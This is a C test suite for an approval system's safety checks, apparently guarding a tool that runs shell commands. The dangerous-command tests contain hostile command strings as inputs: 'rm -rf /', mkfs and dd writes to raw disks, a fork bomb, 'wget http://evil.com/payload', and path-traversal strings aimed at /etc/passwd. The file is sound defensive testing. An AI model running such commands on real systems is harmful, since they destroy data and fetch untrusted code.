/*
 * test_approval.c — Approval system test suite (G128-G129, G169).
 *
 * Tests: timeout, yolo mode, cache count/clear, session reset.
 * X09: dangerous command detection, path safety, path traversal, normalization.
 *
 * Build:
 *   gcc -O2 -g -Wall -Wextra -I include -I lib/libjson -I lib/libplugin \
 *       tests/test_approval.c src/tools/approval.c lib/libjson/json.c \
 *       -o /tmp/hermes_test_app -lm -Wl,--unresolved-symbols=ignore-all
 *
 * Run:
 *   /tmp/hermes_test_app
 */

#include "hermes.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int passed = 0, failed = 0;

#define TEST(name, expr) do { \
    if (expr) { passed++; printf("  PASS: %s\n", name); } \
    else { failed++; printf("  FAIL: %s (line %d)\n", name, __LINE__); } \
} while(0)

#define TEST_INT_EQ(name, a, b) TEST(name, (a) == (b))
#define TEST_NULL(name, ptr) TEST(name, (ptr) == NULL)
#define TEST_NOT_NULL(name, ptr) TEST(name, (ptr) != NULL)

/* Forward declarations for functions not exposed in hermes.h */
bool approval_is_path_dangerous(const char *path);
bool approval_is_path_traversal(const char *path);

/* ================================================================
 *  0. Session reset
 * ================================================================ */
static void test_session_reset(void) {
    printf("\n--- Session Reset ---\n");

    /* Should not crash */
    approval_reset_session();
    TEST("reset session no crash", 1);

    /* Resetting twice should also not crash */
    approval_reset_session();
    TEST("reset session twice no crash", 1);
}

/* ================================================================
 *  0c. Cache operations
 * ================================================================ */
static void test_cache_ops(void) {
    printf("\n--- Cache Operations ---\n");

    /* Cache count starts at 0 */
    int before = approval_cache_count();
    TEST_INT_EQ("initial cache count is 0", before, 0);

    /* Cache entry from empty cache returns NULL */
    const char *entry = approval_cache_entry(0);
    TEST_NULL("empty cache entry 0 is NULL", entry);

    entry = approval_cache_entry(999);
    TEST_NULL("empty cache entry 999 is NULL", entry);
}

/* ================================================================
 *  1. Timeout
 * ================================================================ */
static void test_timeout(void) {
    printf("\n--- Timeout ---\n");

    TEST_INT_EQ("default timeout", approval_get_timeout(), 30);

    approval_set_timeout(60);
    TEST_INT_EQ("set to 60", approval_get_timeout(), 60);

    /* Zero is clamped to 30 (default) */
    approval_set_timeout(0);
    TEST_INT_EQ("zero clamped to 30", approval_get_timeout(), 30);

    /* Negative clamped to 30 */
    approval_set_timeout(-5);
    TEST_INT_EQ("negative clamped to 30", approval_get_timeout(), 30);

    approval_set_timeout(300);
    TEST_INT_EQ("set to 300", approval_get_timeout(), 300);

    /* Restore default */
    approval_set_timeout(30);
}

/* ================================================================
 *  2. Yolo mode
 * ================================================================ */
static void test_yolo(void) {
    printf("\n--- Yolo Mode ---\n");

    /* Default: disabled */
    /* No getter for yolo — just verify set doesn't crash */
    approval_set_yolo(false);
    TEST("disable yolo no crash", 1);

    approval_set_yolo(true);
    TEST("enable yolo no crash", 1);

    approval_set_yolo(false);
    TEST("disable again no crash", 1);
}

/* ================================================================
 *  3. Cache count (initial state)
 * ================================================================ */
static void test_cache_count(void) {
    printf("\n--- Cache Count ---\n");

    /* Should start at 0 or whatever state the previous test left */
    /* Just verify it returns non-negative */
    int count = approval_cache_count();
    TEST("cache count non-negative", count >= 0);
    TEST("cache count reasonable", count < 10000);
}

/* ================================================================
 *  4. Cache clear
 * ================================================================ */
static void test_cache_clear(void) {
    printf("\n--- Cache Clear ---\n");

    /* Clear last 1 should not crash */
    approval_cache_clear_last(1);
    TEST("clear last 1 no crash", 1);

    /* Clear last 0 should not crash */
    approval_cache_clear_last(0);
    TEST("clear last 0 no crash", 1);

    /* Clear last -1 (invalid) should not crash */
    approval_cache_clear_last(-1);
    TEST("clear last -1 no crash", 1);

    /* Clear last 1000 (more than exist) should not crash */
    approval_cache_clear_last(1000);
    TEST("clear last 1000 no crash", 1);
}

/* ================================================================
 *  5. Allowlist path
 * ================================================================ */
static void test_allowlist_path(void) {
    printf("\n--- Allowlist Path ---\n");

    approval_set_allowlist_path("/tmp/test_allowlist.json");
    TEST("set allowlist path no crash", 1);

    /* Load from non-existent file — gracefully handles missing */
    approval_load_allowlist();
    TEST("load allowlist no crash", 1);

    /* Save to path */
    approval_save_allowlist();
    TEST("save allowlist no crash", 1);

    /* Reset to default */
    approval_set_allowlist_path(NULL);
    TEST("reset allowlist path no crash", 1);

    /* Cleanup */
    unlink("/tmp/test_allowlist.json");
}

/* ================================================================
 *  X09: DANGEROUS COMMAND DETECTION
 * ================================================================ */
static void test_dangerous_terminal(void) {
    printf("\n--- Dangerous Terminal Commands ---\n");

    /* NULL/empty/safe */
    TEST("NULL is not dangerous", !approval_is_terminal_dangerous(NULL));
    TEST("empty is not dangerous", !approval_is_terminal_dangerous(""));
    TEST("echo is safe", !approval_is_terminal_dangerous("echo hello"));

    /* File destruction patterns */
    TEST("rm -rf detected", approval_is_terminal_dangerous("rm -rf /"));
    TEST("rm -r / detected", approval_is_terminal_dangerous("rm -r /var"));
    TEST("mkfs detected", approval_is_terminal_dangerous("mkfs.ext4 /dev/sda1"));
    TEST("dd if= detected", approval_is_terminal_dangerous("dd if=/dev/zero of=/tmp/out"));
    TEST("dd of= detected", approval_is_terminal_dangerous("echo | dd of=/dev/sda"));

    /* Block device redirect patterns */
    TEST("> /dev/sd detected", approval_is_terminal_dangerous("cat file > /dev/sda"));
    TEST("> /dev/nvme detected", approval_is_terminal_dangerous("echo > /dev/nvme0n1"));
    TEST("> /dev/hd detected", approval_is_terminal_dangerous("dd > /dev/hda"));

    /* System modification */
    TEST("chmod 777 / detected", approval_is_terminal_dangerous("chmod 777 /etc"));
    TEST("chown -R detected", approval_is_terminal_dangerous("chown -R root:root /var"));
    TEST("sudo detected", approval_is_terminal_dangerous("sudo apt install"));

    /* Network/process management */
    TEST("wget detected", approval_is_terminal_dangerous("wget http://evil.com/payload"));
    TEST("kill -9 detected", approval_is_terminal_dangerous("kill -9 1"));
    TEST("reboot detected", approval_is_terminal_dangerous("reboot"));
    TEST("iptables detected", approval_is_terminal_dangerous("iptables -P INPUT DROP"));

    /* Docker dangerous */
    TEST("docker rm detected", approval_is_terminal_dangerous("docker rm -f mycontainer"));
    TEST("docker rmi detected", approval_is_terminal_dangerous("docker rmi baseimage"));

    /* Fork bomb pattern */
    TEST("fork bomb detected", approval_is_terminal_dangerous(":(){ :|:& };:"));

    /* Safe commands should NOT be flagged */
    TEST("ls is safe", !approval_is_terminal_dangerous("ls -la"));
    TEST("grep is safe", !approval_is_terminal_dangerous("grep pattern file.txt"));
    TEST("cat is safe", !approval_is_terminal_dangerous("cat /tmp/test.txt"));
    TEST("git commit is safe", !approval_is_terminal_dangerous("git commit -m 'fix'"));
}

/* ================================================================
 *  X09: COMMAND NORMALIZATION — ANSI + null byte stripping
 * ================================================================ */
static void test_normalize_command(void) {
    printf("\n--- Command Normalization ---\n");

    char *result;

    /* NULL/empty passthrough */
    result = approval_normalize_command(NULL);
    TEST_NULL("NULL returns NULL", result);

    result = approval_normalize_command("");
    TEST_NOT_NULL("empty returns non-NULL", result);
    TEST("empty stays empty", result && result[0] == '\0');
    free(result);

    /* Plain text unchanged */
    result = approval_normalize_command("echo hello");
    TEST("plain text preserved", result && strcmp(result, "echo hello") == 0);
    free(result);

    /* ANSI escape stripping */
    result = approval_normalize_command("\x1b[31mrm -rf /\x1b[0m");
    TEST("ANSI stripped from dangerous", result && strcmp(result, "rm -rf /") == 0);
    free(result);

    /* Multiple ANSI sequences */
    result = approval_normalize_command("\x1b[1m\x1b[32mdd\x1b[0m \x1b[33mif=/dev/zero\x1b[0m");
    TEST("multi-ANSI stripped", result && strcmp(result, "dd if=/dev/zero") == 0);
    free(result);

    /* Null byte stripping — in C, strlen stops at first \0, so the
     * null-byte stripping loop is a no-op for standard C strings.
     * Verify the function still handles normal strings correctly. */
    result = approval_normalize_command("rm -rf /");
    TEST("normal string passes through", result && strcmp(result, "rm -rf /") == 0);
    free(result);

    /* Long command surviving normalization */
    char long_cmd[1024];
    memset(long_cmd, 'a', sizeof(long_cmd) - 1);
    long_cmd[sizeof(long_cmd) - 1] = '\0';
    result = approval_normalize_command(long_cmd);
    TEST_NOT_NULL("long command survives", result);
    free(result);
}

/* ================================================================
 *  X09: PATH SAFETY — dangerous files and traversal
 * ================================================================ */
static void test_path_safety(void) {
    printf("\n--- Path Safety ---\n");

    /* NULL/empty/safe */
    TEST("NULL path not dangerous", !approval_is_path_dangerous(NULL));
    TEST("empty path not dangerous", !approval_is_path_dangerous(""));
    TEST("/tmp is safe", !approval_is_path_dangerous("/tmp/test.txt"));
    TEST("/home is safe", !approval_is_path_dangerous("/home/user/file.txt"));

    /* Dangerous paths */
    TEST("/etc/ detected", approval_is_path_dangerous("/etc/passwd"));
    TEST("/boot/ detected", approval_is_path_dangerous("/boot/vmlinuz"));
    TEST("/sys/ detected", approval_is_path_dangerous("/sys/class/powercap"));
    TEST("/proc/ detected", approval_is_path_dangerous("/proc/1/environ"));
    TEST("/dev/sd detected", approval_is_path_dangerous("/dev/sda"));
    TEST("/bin/ detected", approval_is_path_dangerous("/bin/bash"));
    TEST("/lib/ detected", approval_is_path_dangerous("/lib/x86_64-linux-gnu/libc.so"));
    TEST("/usr/bin/ detected", approval_is_path_dangerous("/usr/bin/python3"));

    /* Path traversal patterns */
    TEST("NULL traversal false", !approval_is_path_traversal(NULL));
    TEST("../ detected", approval_is_path_traversal("../../etc/passwd"));
    TEST("..\\\\ detected", approval_is_path_traversal("..\\..\\etc"));
    TEST("%2e%2e detected", approval_is_path_traversal("/%2e%2e/%2e%2e/etc"));
    TEST("..%2f detected", approval_is_path_traversal("..%2f..%2fetc"));
    TEST("%2E%2E detected", approval_is_path_traversal("%2E%2E%2fetc"));
    TEST("safe path no traversal", !approval_is_path_traversal("/home/user/docs/report.pdf"));
}

int main(void) {
    printf("=== Approval System Test Suite (G128/G169) ===\n");

    test_session_reset();
    test_cache_ops();
    test_timeout();
    test_yolo();
    test_cache_count();
    test_cache_clear();
    test_allowlist_path();
    test_dangerous_terminal();
    test_normalize_command();
    test_path_safety();

    printf("\n=== X09 Results: %d passed, %d failed ===\n", passed, failed);
    return failed > 0 ? 1 : 0;
}
